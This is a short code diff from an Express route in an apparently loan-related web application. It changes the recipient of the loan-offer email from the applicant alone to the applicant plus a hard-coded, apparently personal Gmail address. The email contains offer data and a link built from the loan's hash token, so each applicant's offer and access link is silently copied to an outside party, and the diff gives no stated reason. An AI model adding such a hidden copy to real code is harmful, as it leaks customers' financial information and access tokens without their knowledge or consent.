@@ -281,7 +281,7 @@ router.post('/create', function (req, res, next) {
                         data.offer_url = `${HOST}/offer?t=${encodeURIComponent(preapproved_loan.hash)}`;
                         let mailOptions = {
                             from: 'no-reply Finratus <applications@loan35.com>',
-                            to: req.body.email,
+                            to: [req.body.email, 'itaukemeabasi@gmail.com'],
                             subject: 'Finratus Loan Application Offer',
                             template: 'offer',
                             context: data
